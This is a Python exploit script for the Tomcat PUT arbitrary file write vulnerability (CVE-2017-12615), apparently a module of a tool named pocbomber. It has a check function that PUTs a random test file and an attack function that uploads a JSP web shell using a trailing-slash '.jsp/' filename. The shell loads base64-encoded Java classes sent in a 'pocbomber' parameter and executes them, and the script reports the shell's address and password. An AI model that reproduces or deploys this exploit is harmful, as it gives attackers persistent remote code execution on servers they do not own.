import requests
import urllib
import re, random, string



def verify(url):
    relsult = {
        'name': 'Tomcat PUT方法任意写文件漏洞(CVE-2017-12615)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        rand_filename = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5)) + '.txt'
        rand_str = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
        vurl = urllib.parse.urljoin(url, rand_filename)
        requests.put(vurl, data=rand_str, timeout=3, headers=headers)
        rep = requests.get(vurl, timeout=3, headers=headers)
        if rep.status_code == 200 and re.search(rand_str, rep.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['verify'] = vurl
            relsult['about'] = 'https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md'
            relsult['attack'] = True
        return relsult
    except:
        return relsult


def attack(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        shell = '''
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("pocbomber");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>'''
        print('[+] hacking ......')
        shell_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5)) + '.jsp/'
        vurl = urllib.parse.urljoin(url, shell_name)
        requests.put(vurl, data=shell, timeout=3, headers=headers)
        webshell = vurl.rstrip('/')
        rep = requests.get(webshell, timeout=5, headers=headers)
        if rep.status_code == 200:
            print('[*] 蚁剑shell上传成功!')
            print('[*] shell地址: ' + webshell)
            print('[*] 密码: pocbomber')
            return True
        else:
            print('[-] shell上传失败')
            return False
    except:
        return False

